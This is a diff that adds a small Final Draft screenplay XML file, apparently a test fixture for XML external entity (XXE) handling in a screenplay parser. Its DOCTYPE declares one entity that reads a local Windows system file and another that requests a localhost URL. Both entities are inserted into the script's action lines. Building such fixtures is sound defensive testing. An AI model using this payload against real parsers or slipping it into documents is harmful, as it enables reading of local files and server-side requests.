@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE FinalDraft [
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+  <!ENTITY net SYSTEM "http://127.0.0.1:9/openframe-xxe">
+]>
+<FinalDraft DocumentType="Script" Version="5">
+  <Content>
+    <Paragraph Type="Scene Heading"><Text>INT. LAB - NIGHT</Text></Paragraph>
+    <Paragraph Type="Action"><Text>&xxe;</Text></Paragraph>
+    <Paragraph Type="Action"><Text>&net;</Text></Paragraph>
+  </Content>
+</FinalDraft>
